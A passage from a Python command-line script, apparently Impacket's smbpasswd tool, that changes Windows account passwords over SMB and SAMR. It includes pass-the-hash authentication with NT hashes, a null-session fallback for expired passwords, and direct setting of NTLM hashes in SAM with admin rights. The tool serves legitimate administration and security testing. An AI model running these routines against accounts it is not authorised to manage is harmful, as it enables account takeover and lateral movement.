				logging.critical('Passwords do not match, try again.')
				sys.exit(1)
		else:
			newPassword = options.newpass

	smbpasswd = SMBPasswd(address, domain, username, oldPassword, newPassword, oldPwdHashLM, oldPwdHashNT, newPwdHashLM, newPwdHashNT)

	if options.altuser is not None:
		try:
			altDomain, altUsername = options.altuser.split('/')
		except ValueError:
			altDomain = domain
			altUsername = options.altuser

		if options.altpass is not None and options.althash is None:
			altPassword = options.altpass
			altNTHash = ''
		elif options.altpass is None and options.althash is not None:
			altPassword = ''
			altNTHash = options.althash
		elif options.altpass is None and options.althash is None:
			logging.critical('Please, provide either alternative password or NT hash for RPC authentication.')
			sys.exit(1)
		else:  # if options.altpass is not None and options.althash is not None
			logging.critical('Argument -altpass not allowed with argument -althash.')
			sys.exit(1)
	else:
		altUsername = ''

	try:
		if altUsername == '':
			smbpasswd.connect()
		else:
			logging.debug('Using {}\\{} credentials to connect to RPC.'.format(altDomain, altUsername))
			smbpasswd.connect(altDomain, altUsername, altPassword, altNTHash)
	except Exception as e:
		if any(msg in str(e) for msg in ['STATUS_PASSWORD_MUST_CHANGE', 'STATUS_PASSWORD_EXPIRED']):
			if newPassword:
				logging.warning('Password is expired, trying to bind with a null session.')
				smbpasswd.connect(anonymous=True)
			else:
				logging.critical('Cannot set new NTLM hashes when current password is expired. Provide a plaintext value for the new password.')
				sys.exit(1)
		elif 'STATUS_LOGON_FAILURE' in str(e):
			logging.critical('Authentication failure.')
			sys.exit(1)
		else:
			raise e

	if options.admin:
		# Inject credentials into SAM (requires admin's privileges)
		smbpasswd.hSamrSetInformationUser()
	else:
		if newPassword:
			# If using a plaintext value for the new password
			smbpasswd.hSamrUnicodeChangePasswordUser2()
		else:
			# If using NTLM hashes for the new password
			smbpasswd.hSamrChangePasswordUser()
```

